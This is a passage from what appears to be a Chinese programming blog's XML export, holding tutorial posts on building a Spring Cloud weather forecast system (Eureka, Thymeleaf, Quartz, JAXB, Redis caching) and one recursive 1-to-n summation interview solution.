2、添加启动代码中添加@EnableEurekaServer注解 12345678@SpringBootApplication@EnableEurekaServerpublic class WeatherEurekaServerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(WeatherEurekaServerApplication.class, args); &#125;&#125; 3、配置文件 在默认设置下，该服务注册中心也会将自己作为客户端来尝试注册它自己，所以我们需要禁用它的客户端注册行为，在application.yml： 12345678910server: port: 8761eureka: instance: hostname: localhost client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/ eureka.client.register-with-eureka ：表示是否将自己注册到Eureka Server，默认为true。 eureka.client.fetch-registry ：表示是否从Eureka Server获取注册信息，默认为true。 eureka.client.serviceUrl.defaultZone ：设置与Eureka Server交互的地址，查询服务和注册服务都需要依赖这个地址。默认是http://localhost:8761/eureka ；多个地址可使用 , 分隔。 启动工程后，访问：http://localhost:8761/ ，可以看到下面的页面，其中还没有发现任何服务 关于集群，参考这篇文章：http://www.ityouknow.com/springcloud/2017/05/10/springcloud-eureka.html 4.4.Eureka Client基本与上一个是类似的。 1@EnableDiscoveryClient 主要的配置文件： 1234567spring: application: name: weather-eureka-clienteureka: client: service-url: defaultZone: http://localhost:8761/eureka 这样同时启动Eureka Server和Eureka Client两个工程。在网站中输入localhost://8761就可以看到注册到Eureka Server的实例了。 5.本门实战将之前的四个微服务改造为eureka的客户端。 即将 mas-weather-collection-server mas-weather-report-server mas-weather-data-server mas-weather-city-server 改为： mas-weather-collection-eureka mas-weather-report-eureka mas-weather-data-eureka mas-weather-city-eureka 改造过程十分简单，就是引入依赖，修改配置即可。 同时启动这四个微服务客户端和一个eureka服务端。 我们可以看到： 电脑要爆炸了~~ 下面，这些微服务之间可以相互访问了。]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题48：求1+2+...+n】]]></title>
    <url>%2F2018%2F11%2F22%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9848%EF%BC%9A%E6%B1%821%2B2%2B%2Bn%E3%80%91%2F</url>
    <content type="text"><![CDATA[求1+2+…+n. 题目描述求1+2+3+…+n，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。 解题思路那么可以用&amp;&amp;短路与，&amp;&amp;前面只要n还不是0，就继续后面；&amp;&amp;后面就是求和，这个求和是一个递归，递归的终止条件当然就是n=0咯。 代码实现123456789public class Solution &#123; public int Sum_Solution(int n) &#123; int sum = n; //利用&amp;&amp;的短路特性 //Sum_Solution(--n)等于0的时候,即n=0的时候，停止递归，否则一直加 boolean flag = (sum&gt;0) &amp;&amp; ((sum+=Sum_Solution(--n))&gt;0); return sum; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.天气预报系统-拆分本系统]]></title>
    <url>%2F2018%2F11%2F21%2F6.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E6%8B%86%E5%88%86%E6%9C%AC%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[天气预报系统-拆分本系统 天气数据采集微服务这个微服务专门提供数据采集和定时更新功能，将数据存储在redis中。 该服务的核心service中的方法是：syncDataByCityId，就是根据cityId来将数据同步进redis。 代码：https://gitee.com/_swg/weather-action-spring-cloud/tree/master/msa-weather-collection-server 天气数据API这个服务专门来提供天气数据的查询功能。 将前端页面以及定时、城市相关的代码全部剔除。只留下两个API： 123WeatherResponse getDataByCityId(String cityId);WeatherResponse getDataByCityName(String cityName); 代码：https://gitee.com/_swg/weather-action-spring-cloud/tree/master/msa-weather-data-server 天气预报微服务本服务的主要功能为：用户通过浏览器来访问，可以返回一个天气预报的界面。 就将redis和定时任务相关的都删掉。我们只需要一个接口：1Weather getDataByCityId(String cityId); 因为展示数据需要用到城市信息，但是此时还没有，所以需要自己去模拟一些数据去显示。 代码：https://gitee.com/_swg/weather-action-spring-cloud/tree/master/msa-weather-report-server 城市数据API本服务只提供城市列表数据功能。 1List&lt;City&gt; listCity() throws Exception; 有的需要填充一些假数据之后，都可以独立运行。 代码：https://gitee.com/_swg/weather-action-spring-cloud/tree/master/msa-weather-city-server]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.天气预报系统-服务拆分和业务建模]]></title>
    <url>%2F2018%2F11%2F21%2F5.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86%E5%92%8C%E4%B8%9A%E5%8A%A1%E5%BB%BA%E6%A8%A1%2F</url>
    <content type="text"><![CDATA[天气预报系统-服务拆分和业务建模 单体架构我们熟悉的单体MVC架构： 用户表示层业务层数据访问层数据库 单块结构的优缺点： 优点 缺点 功能划分清楚 功能仍然太大 层次关系良好 支付周期变长 每一层独立 升级风险高 部署简单 维护成本增加 技术单一 可伸缩性差 用人成本低 监控困难 单体架构如何转化为微服务什么是SOA？ SOA是一种设计方法，其中包含多个服务，而服务之间通过配合最终会提供一系列功能。一个服务通常以独立的形式存在于操作系统进程中。服务之间通过网络调用，而非采用进程内调用的方式进行通信。 所以，SOA只是一种架构设计模式，SOAP，REST，RPC是根据这种设计模式构建出来的规范。其中SOAP通俗理解就是http+xml的形式，REST就是http+json的形式，RPC是基于socket的形式。dubbo就是典型的RPC框架，而SpringCloud就是遵守REST规范的生态系统。 SOA VS 微服务 话说1979年，又是一个春天，莆田乡下的赤脚医生吴大牛被改革的春风吹的心潮澎湃，说干就干，吴大牛趁着夜色朦胧找大队支书汇报了汇报思想，第二天就承包了村卫生室，开启了自己的在医疗圈的传奇历程。 乡村诊所大家都知道，没什么复杂的东东，房子只有一间，一个大柜台中间隔开，一半是诊疗兼候诊区，一半是药房，看病就直接找医生，如果前面有人就自己找个位子坐下，排队等一会，秩序倒也井然，看完病了医生直接给抓药，然后下一个继续，也不需要护士和药剂师，吴大牛一个人全部包办。 辛辛苦苦忙碌了十年，时间来到了八九年，又是一个春天，昔日的单身汉吴大牛已成为十里八乡的知名人物，媳妇娶上了不说，家里还增加了一对双胞胎儿子，二层的小洋房也甚是气派。可是也有烦心事，尽管乡村诊所扩大到了两间，媳妇还偶尔能去帮帮忙，但是医生还是只有自己一个，天天从早忙到晚挣的都是一份钱，想多挣点怎么办？吴大牛日思夜想，还真给他想出来一招，怎么办，扩大规模，多招几个医生一起干。原来吴大牛只能治头疼脑热和跌打损伤，现在新招了一个医科大学的毕业生刘小明专治感冒发烧，又从邻村请来了老大夫李阿花专治妇科病，现在一个普通的小诊所就变成了有三个独立科室加一个公共药房（吴大牛媳妇负责）的小医院了，吴大牛是外科主任兼院长，收入那可比之前翻了三番。人逢喜事精神爽，大牛院长请县里的书法名家为新医院书写了牌匾–“博爱医院”，挑了一个黄道吉日正式挂了上去。 一晃十年过去了，又是一个春天，吴大牛的博爱医院已经发展到了内科外科妇科五官科骨科生殖科六个科室，每个科室3到5名医生不等，也耗费巨资购进了血夜化验B超等先进仪器，大牛院长也早已脱离了医疗一线，成为了专职的管理者，但是医院的大事小事大家都找他，就这三十多号员工搞的他每天是焦头烂额，想再扩大规模实在是有心无力了。要说还是大学生有水平，老部下刘小明给大牛院长献了一计，把各个科室独立出去，让各个科室主任自己管理，大牛院长只管科室之间的协调和医院发展的大事，这样既能调动基层的积极性，又能把大牛院长解放出来扩大生产抓大事谋大事，岂不妙哉？就这样，博爱医院的新一轮改革轰轰烈烈的展开了。 又是一个十年，又是一个春天，大牛院长已成为本地知名的企业家，博爱医院也发展到了二十三个科室数百名员工，发展中也出现了新问题，由于各个科室独立挂号、收费、化验，有的科室整天忙忙碌碌效益好，有的科室就相对平庸些，连分到的各种检查仪器都不能满负荷运行，整个医院养了不少闲人。这时候大牛院长视野也开阔了，请来了管理专家进行了顶层设计，把原来分散到各个科室的非核心服务全部收归集中管理，把原来二十三个挂号窗口整合为十个，二十三个收费窗口整合为八个，集中布设在一楼大厅为全院服务，还把分散在各个科室的检查仪器集中起来成立独立的检验科，也为全院服务，这样人人有活干，整个医院的服务能力又上了一个新台阶，这轮改革后博爱医院通过了各级部门的鉴定成为了远近驰名的三甲医院，吴大牛也换身一变成为了博爱集团的CEO兼董事长，下一步就准备IPO上市了。 说到这里大家可能有点糊涂，这个跟微服务有嘛关系？在孙老师看来，大牛诊所的1.0阶段就相当于软件开发的单体结构，一个程序员打天下，从头编到尾，很难做大做强。大牛诊所的2.0阶段就相当于软件开发的垂直结构，各科室按照业务划分，很容易横向扩展。博爱医院的1.0阶段就相当于软件开发的SOA结构，除了药房（数据库）外各个服务独立提供（科室主任负责），但需要大牛院长（ESB总线）来协调。博爱医院的2.0阶段就相当于软件开发的微服务结构，公共服务院内共享，科室主任管理功能弱化（只管医生业务），优点是扩容方便，哪个部门缺人直接加，不用看上下游，资源利用率高，人员和设备效率高。为什么要变呢？小诊所有小诊所的活法，大医院有大医院的骄傲。无他，天下熙熙，皆为利来；天下攘攘，皆为利往。 设计原则 拆分足够微：划分比较细，但是也不能太细，增加管理问题 轻量级通信：rest，rpc等方式在网络上通信 单一职责原则：高内聚，低耦合，确定服务边界 如何设计微服务系统服务拆分—-》服务注册—-》服务发现—-》服务消费(调用另外一个服务)—-》统一入口(服务很多的时候需要有一个统一的入口)—-》配置管理(管理每个服务的配置信息)—-》熔断机制(保护系统避免崩溃)—-》自动扩展(根据负荷自动扩展集群) 微服务拆分的意义 易于实现 易于部署 易于维护 易于更新 本天气预报系统可以拆分为： 天气数据采集服务：数据采集和数据存储 天气预报服务：数据展示 天气数据API：数据查询 城市数据API：数据查询]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4.天气预报系统-前端样式]]></title>
    <url>%2F2018%2F11%2F21%2F4.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E5%89%8D%E7%AB%AF%E6%A0%B7%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[天气预报系统-前端样式 Thymeleaf数据动态地渲染，这里采用Thymeleaf模板引擎。 首先是引入依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; 后端的controller： 12345678910111213141516171819@RestController@RequestMapping("/report")public class WeatherReportController &#123; @Autowired private IWeatherReportService weatherReportService; @Autowired private ICityDataService cityDataService; @GetMapping("/cityId/&#123;cityId&#125;") public ModelAndView getReportByCityId(@PathVariable("cityId") String cityId, Model model) throws Exception &#123; Weather weather = weatherReportService.getDataByCityId(cityId); model.addAttribute("title","蜗牛天气预报"); model.addAttribute("cityId",cityId); model.addAttribute("cityList",cityDataService.listCity()); model.addAttribute("report",weather); return new ModelAndView("weather/report","reportModel",model); &#125;&#125; 前端的简单页面： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN" xmlns:th="http://www.thymeleaf.org"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;蜗牛天气预报系统&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h3 th:text="$&#123;reportModel.title&#125;"&gt;snail&lt;/h3&gt;&lt;!--下拉框来选择城市--&gt;&lt;select&gt; &lt;option th:each="city : $&#123;reportModel.cityList&#125;" th:value="$&#123;city.cityId&#125;" th:text="$&#123;city.cityName&#125;" th:selected="$&#123;city.cityId eq reportModel.cityId &#125;"&gt; &lt;/option&gt;&lt;/select&gt;&lt;!--显示一下选择后的城市的名称--&gt;&lt;h1 th:text="$&#123;reportModel.report.city&#125;"&gt;城市名称&lt;/h1&gt;&lt;!--显示这个城市的一些基本天气状况--&gt;&lt;p&gt; 空气质量指数：&lt;span th:text="$&#123;reportModel.report.aqi&#125;"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt; 当前温度：&lt;span th:text="$&#123;reportModel.report.wendu&#125;"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt; 温馨提示：&lt;span th:text="$&#123;reportModel.report.ganmao&#125;"&gt;&lt;/span&gt;&lt;/p&gt;&lt;!--显示未来几天的天气状况--&gt;&lt;div th:each="forecast : $&#123;reportModel.report.forecast&#125;"&gt; &lt;div&gt; &lt;p th:text="$&#123;forecast.date&#125;"&gt;日期&lt;/p&gt; &lt;p th:text="$&#123;forecast.type&#125;"&gt;天气类型&lt;/p&gt; &lt;p th:text="$&#123;forecast.high&#125;"&gt;最高温度&lt;/p&gt; &lt;p th:text="$&#123;forecast.low&#125;"&gt;最低温度&lt;/p&gt; &lt;p th:text="$&#123;forecast.fengxiang&#125;"&gt;风向&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 注意这里修正一下了一下之前存在的一个小错误，就是请求天气的接口应该是：http://wthrcdn.etouch.cn/weather_mini?citykey=xxx 而我之前程序中写的是http://wthrcdn.etouch.cn/weather_mini?cityKey=xxx 就是这个citykey中的k，应该是小写。导致请求不到数据，前端直接报错。 Bootstrap稍微美化一下页面。引入bootstrap。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN" xmlns:th="http://www.thymeleaf.org"&gt;&lt;head&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt; &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt; &lt;title&gt;蜗牛天气预报系统&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="container controls-pane"&gt; &lt;div class="row"&gt; &lt;h3 th:text="$&#123;reportModel.title&#125;"&gt;snail&lt;/h3&gt; &lt;select class="custom-select" id="selectCityId"&gt; &lt;option th:each="city : $&#123;reportModel.cityList&#125;" th:value="$&#123;city.cityId&#125;" th:text="$&#123;city.cityName&#125;" th:selected="$&#123;city.cityId eq reportModel.cityId &#125;"&gt; &lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;h1 class="text-success" th:text="$&#123;reportModel.report.city&#125;"&gt;城市名称&lt;/h1&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;p&gt; 空气质量指数：&lt;span th:text="$&#123;reportModel.report.aqi&#125;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;p&gt; 当前温度：&lt;span th:text="$&#123;reportModel.report.wendu&#125;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;p&gt; 温馨提示：&lt;span th:text="$&#123;reportModel.report.ganmao&#125;"&gt;&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;div class="row"&gt; &lt;div class="card border-info" th:each="forecast : $&#123;reportModel.report.forecast&#125;"&gt; &lt;div class="card-body text-info"&gt; &lt;p class="card-text" th:text="$&#123;forecast.date&#125;"&gt;日期&lt;/p&gt; &lt;p class="card-text " th:text="$&#123;forecast.type&#125;"&gt;天气类型&lt;/p&gt; &lt;p class="card-text" th:text="$&#123;forecast.high&#125;"&gt;最高温度&lt;/p&gt; &lt;p class="card-text" th:text="$&#123;forecast.low&#125;"&gt;最低温度&lt;/p&gt; &lt;p class="card-text" th:text="$&#123;forecast.fengxiang&#125;"&gt;风向&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;&lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;!-- Optional JavaScript --&gt;&lt;script type="text/javascript" th:src="@&#123;/js/weather/report.js&#125;"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 其中下拉框选中向后端请求每个城市数据的js： 1234567$(function()&#123; $("#selectCityId").change(function()&#123; var cityId = $("#selectCityId").val(); var url = '/report/cityId/'+ cityId; window.location.href = url; &#125;)&#125;); 最后的效果：]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.天气预报系统-天气数据同步]]></title>
    <url>%2F2018%2F11%2F21%2F3.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-%E5%A4%A9%E6%B0%94%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%2F</url>
    <content type="text"><![CDATA[天气预报系统-天气数据同步 quartz如何整合数据需要定时地刷新，不能等到用户来获取的时候才更新，这里用最常用的quartz定时器来实现。 首先时引入依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt;&lt;/dependency&gt; 下面定义一个执行的任务，先什么都不干，就打印一句话即可： 12345678@Slf4jpublic class WeatherDataSyncJob extends QuartzJobBean &#123; @Override protected void executeInternal(JobExecutionContext context) throws JobExecutionException &#123; log.info("天气数据同步任务开始"); &#125;&#125; 下面要定义配置类： 首先是要定义这个任务的细节：JobDetail，就是说我们配置的这个quartz里面的任务是谁？给他起个名字啥的。 后面个时定义触发器，决定了刚才定义的这个JobDetail多长时间执行一次。这里是为了模拟想过，定义了两秒就执行一次。那么我们启动项目后，看到的效果应该是每两秒打印一次日志。 1234567891011121314151617181920212223@Configurationpublic class QuartzConfig &#123; //定义一个jobDetail,就是注册一个定时任务，具体如何执行时在WeatherDataSyncJob中定义 //具体何时执行，是下面的Trigger定义 @Bean public JobDetail weatherDataSyncDetail()&#123; return JobBuilder.newJob(WeatherDataSyncJob.class). withIdentity("WeatherDataSyncJob"). storeDurably().build(); &#125; //触发器 @Bean public Trigger weatherDataSyncTrigger()&#123; SimpleScheduleBuilder scheduleBuilder = SimpleScheduleBuilder .simpleSchedule() .withIntervalInSeconds(2)//两秒去自动执行一次 .repeatForever(); return TriggerBuilder.newTrigger().forJob(weatherDataSyncDetail()) .withIdentity("weatherDataSyncTrigger") .withSchedule(scheduleBuilder).build(); &#125;&#125; 拉取城市信息网站： http://mobile.weather.com.cn/js/citylist.xml 比如我将江苏省的单独拿出来： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;xml&gt; &lt;c c1="0"&gt; &lt;d d1="101190101" d2="南京" d3="nanjing" d4="江苏"/&gt; &lt;d d1="101190102" d2="溧水" d3="lishui" d4="江苏"/&gt; &lt;d d1="101190103" d2="高淳" d3="gaochun" d4="江苏"/&gt; &lt;d d1="101190104" d2="江宁" d3="jiangning" d4="江苏"/&gt; &lt;d d1="101190105" d2="六合" d3="luhe" d4="江苏"/&gt; &lt;d d1="101190106" d2="江浦" d3="jiangpu" d4="江苏"/&gt; &lt;d d1="101190107" d2="浦口" d3="pukou" d4="江苏"/&gt; &lt;d d1="101190201" d2="无锡" d3="wuxi" d4="江苏"/&gt; &lt;d d1="101190202" d2="江阴" d3="jiangyin" d4="江苏"/&gt; &lt;d d1="101190203" d2="宜兴" d3="yixing" d4="江苏"/&gt; &lt;d d1="101190204" d2="锡山" d3="xishan" d4="江苏"/&gt; &lt;d d1="101190301" d2="镇江" d3="zhenjiang" d4="江苏"/&gt; &lt;d d1="101190302" d2="丹阳" d3="danyang" d4="江苏"/&gt; &lt;d d1="101190303" d2="扬中" d3="yangzhong" d4="江苏"/&gt; &lt;d d1="101190304" d2="句容" d3="jurong" d4="江苏"/&gt; &lt;d d1="101190305" d2="丹徒" d3="dantu" d4="江苏"/&gt; &lt;d d1="101190401" d2="苏州" d3="suzhou" d4="江苏"/&gt; &lt;d d1="101190402" d2="常熟" d3="changshu" d4="江苏"/&gt; &lt;d d1="101190403" d2="张家港" d3="zhangjiagang" d4="江苏"/&gt; &lt;d d1="101190404" d2="昆山" d3="kunshan" d4="江苏"/&gt; &lt;d d1="101190405" d2="吴中" d3="wuzhong" d4="江苏"/&gt; &lt;d d1="101190407" d2="吴江" d3="wujiang" d4="江苏"/&gt; &lt;d d1="101190408" d2="太仓" d3="taicang" d4="江苏"/&gt; &lt;d d1="101190501" d2="南通" d3="nantong" d4="江苏"/&gt; &lt;d d1="101190502" d2="海安" d3="haian" d4="江苏"/&gt; &lt;d d1="101190503" d2="如皋" d3="rugao" d4="江苏"/&gt; &lt;d d1="101190504" d2="如东" d3="rudong" d4="江苏"/&gt; &lt;d d1="101190507" d2="启东" d3="qidong" d4="江苏"/&gt; &lt;d d1="101190508" d2="海门" d3="haimen" d4="江苏"/&gt; &lt;d d1="101190509" d2="通州" d3="tongzhou" d4="江苏"/&gt; &lt;d d1="101190601" d2="扬州" d3="yangzhou" d4="江苏"/&gt; &lt;d d1="101190602" d2="宝应" d3="baoying" d4="江苏"/&gt; &lt;d d1="101190603" d2="仪征" d3="yizheng" d4="江苏"/&gt; &lt;d d1="101190604" d2="高邮" d3="gaoyou" d4="江苏"/&gt; &lt;d d1="101190605" d2="江都" d3="jiangdu" d4="江苏"/&gt; &lt;d d1="101190606" d2="邗江" d3="hanjiang" d4="江苏"/&gt; &lt;d d1="101190701" d2="盐城" d3="yancheng" d4="江苏"/&gt; &lt;d d1="101190702" d2="响水" d3="xiangshui" d4="江苏"/&gt; &lt;d d1="101190703" d2="滨海" d3="binhai" d4="江苏"/&gt; &lt;d d1="101190704" d2="阜宁" d3="funing" d4="江苏"/&gt; &lt;d d1="101190705" d2="射阳" d3="sheyang" d4="江苏"/&gt; &lt;d d1="101190706" d2="建湖" d3="jianhu" d4="江苏"/&gt; &lt;d d1="101190707" d2="东台" d3="dongtai" d4="江苏"/&gt; &lt;d d1="101190708" d2="大丰" d3="dafeng" d4="江苏"/&gt; &lt;d d1="101190709" d2="盐都" d3="yandu" d4="江苏"/&gt; &lt;d d1="101190801" d2="徐州" d3="xuzhou" d4="江苏"/&gt; &lt;d d1="101190802" d2="铜山" d3="tongshan" d4="江苏"/&gt; &lt;d d1="101190803" d2="丰县" d3="fengxian" d4="江苏"/&gt; &lt;d d1="101190804" d2="沛县" d3="peixian" d4="江苏"/&gt; &lt;d d1="101190805" d2="邳州" d3="pizhou" d4="江苏"/&gt; &lt;d d1="101190806" d2="睢宁" d3="suining" d4="江苏"/&gt; &lt;d d1="101190807" d2="新沂" d3="xinyi" d4="江苏"/&gt; &lt;d d1="101190901" d2="淮安" d3="huaian" d4="江苏"/&gt; &lt;d d1="101190902" d2="金湖" d3="jinhu" d4="江苏"/&gt; &lt;d d1="101190903" d2="盱眙" d3="xuyi" d4="江苏"/&gt; &lt;d d1="101190904" d2="洪泽" d3="hongze" d4="江苏"/&gt; &lt;d d1="101190905" d2="涟水" d3="lianshui" d4="江苏"/&gt; &lt;d d1="101190906" d2="淮阴区" d3="huaiyinqu" d4="江苏"/&gt; &lt;d d1="101190908" d2="淮安区" d3="huaianqu" d4="江苏"/&gt; &lt;d d1="101191001" d2="连云港" d3="lianyungang" d4="江苏"/&gt; &lt;d d1="101191002" d2="东海" d3="donghai" d4="江苏"/&gt; &lt;d d1="101191003" d2="赣榆" d3="ganyu" d4="江苏"/&gt; &lt;d d1="101191004" d2="灌云" d3="guanyun" d4="江苏"/&gt; &lt;d d1="101191005" d2="灌南" d3="guannan" d4="江苏"/&gt; &lt;d d1="101191101" d2="常州" d3="changzhou" d4="江苏"/&gt; &lt;d d1="101191102" d2="溧阳" d3="liyang" d4="江苏"/&gt; &lt;d d1="101191103" d2="金坛" d3="jintan" d4="江苏"/&gt; &lt;d d1="101191104" d2="武进" d3="wujin" d4="江苏"/&gt; &lt;d d1="101191201" d2="泰州" d3="taizhou" d4="江苏"/&gt; &lt;d d1="101191202" d2="兴化" d3="xinghua" d4="江苏"/&gt; &lt;d d1="101191203" d2="泰兴" d3="taixing" d4="江苏"/&gt; &lt;d d1="101191204" d2="姜堰" d3="jiangyan" d4="江苏"/&gt; &lt;d d1="101191205" d2="靖江" d3="jingjiang" d4="江苏"/&gt; &lt;d d1="101191301" d2="宿迁" d3="suqian" d4="江苏"/&gt; &lt;d d1="101191302" d2="沭阳" d3="shuyang" d4="江苏"/&gt; &lt;d d1="101191303" d2="泗阳" d3="siyang" d4="江苏"/&gt; &lt;d d1="101191304" d2="泗洪" d3="sihong" d4="江苏"/&gt; &lt;d d1="101191305" d2="宿豫" d3="suyu" d4="江苏"/&gt; &lt;/c&gt;&lt;/xml&gt; 其实思路很简单，就是从xml文件中获取所有的城市信息，转换为城市列表对象。然后遍历城市中的id，就可以根据id拼接url去直接去调用天气的接口去查询天气，然后重新覆盖redis中的天气数据即可。12345678910111213141516171819202122232425262728@Slf4jpublic class WeatherDataSyncJob extends QuartzJobBean &#123; @Autowired private IWeatherDataService weatherDataService; @Autowired private ICityDataService cityDataService; @Override protected void executeInternal(JobExecutionContext context) throws JobExecutionException &#123; log.info("天气数据同步任务开始"); //获取城市列表 List&lt;City&gt; cityList = null; try &#123; cityList = cityDataService.listCity(); &#125; catch (Exception e) &#123; log.error("获取城市列表失败！",e); &#125; //遍历城市id获取天气 for(City city:cityList)&#123; String cityId = city.getCityId(); log.info("定时器更新了&#123;&#125;这个城市的天气信息", city.getCityName()); weatherDataService.syncDataByCityId(cityId); &#125; log.info("天气数据同步任务结束"); &#125;&#125; 具体如何读取xml文件： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Service@Slf4jpublic class CityDataServiceImpl implements ICityDataService &#123; @Override public List&lt;City&gt; listCity() throws Exception &#123; //读取xml文件 Resource resource = new ClassPathResource("citylist.xml"); //读取文件的buffer流 BufferedReader bf = new BufferedReader(new InputStreamReader(resource.getInputStream(),"UTF-8")); StringBuffer buffer = new StringBuffer(); String line = ""; while((line = bf.readLine()) != null)&#123; buffer.append(line); &#125; //此时数据已经读到buffer里了 bf.close(); //xml转换为java对象 CityList cityList = (CityList) XmlBuilder.xmlStrToObj(CityList.class,buffer.toString()); return cityList.getCityList(); &#125;&#125;/** * @Author 【swg】. * @Date 2018/11/19 17:09 * @DESC xml转换为对象 * @CONTACT 317758022@qq.com */public class XmlBuilder &#123; public static Object xmlStrToObj(Class&lt;?&gt; clazz,String xmlStr) throws Exception&#123; Object xmlObject = null; Reader reader = null; JAXBContext context = JAXBContext.newInstance(clazz); //xml转为对象的接口 Unmarshaller unmarshaller = context.createUnmarshaller(); reader = new StringReader(xmlStr); xmlObject = unmarshaller.unmarshal(reader); if(null != reader)&#123; reader.close(); &#125; return xmlObject; &#125;&#125; 其中，解析xml我们用到了JAXB，他是什么呢？维基百科： JAXB（Java Architecture for XML Binding简称JAXB）允许Java开发人员将Java类映射为XML表示方式。JAXB提供两种主要特性：将一个Java对象序列化为XML，以及反向操作，将XML解析成Java对象。换句话说，JAXB允许以XML格式存储和读取数据，而不需要程序的类结构实现特定的读取XML和保存XML的代码。]]></content>
      <tags>
        <tag>从天气项目看spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2.天气预报系统-redis提升性能]]></title>
    <url>%2F2018%2F11%2F21%2F2.%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%B3%BB%E7%BB%9F-redis%E6%8F%90%E5%8D%87%E6%80%A7%E8%83%BD%2F</url>
    <content type="text"><![CDATA[天气预报系统-redis提升性能 很显然，这个免费的接口能承受的并发是很低的，并且我们的服务器作为一个中转站去向这个接口请求数据也非常地耗时，于性能和稳定性都没有保障，所以我们需要redis作为缓存来提高性能。 所以，我们需要用redis来重构一下。 先引入一下依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; 思路很简单：缓存中有数据的时候，就直接从缓存中拿即可，若缓存中没有此数据，就去调用接口重新获取并且再存到缓存中。 123456789101112131415161718192021222324252627282930313233343536373839private static final long TIME_OUT = 30*60L;private WeatherResponse doGetWeather(String uri)&#123; //先去缓存中查询，有就直接拿缓存中的数据，否则调用接口 String key = uri; String strBody = null; WeatherResponse resp = null; ObjectMapper mapper = new ObjectMapper(); ValueOperations&lt;String,String&gt; ops = stringRedisTemplate.opsForValue(); if(stringRedisTemplate.hasKey(uri))&#123; //缓存有数据 log.info("Redis has data!"); strBody = ops.get(key); &#125;else&#123; //缓存没有数据 log.info("Redis don't thas data!"); ResponseEntity&lt;String&gt; resString = restTemplate.getForEntity(uri,String.class); if(resString.getStatusCodeValue() == 200) &#123; strBody = resString.getBody(); &#125; //数据写入缓存 ops.set(key,strBody,TIME_OUT, 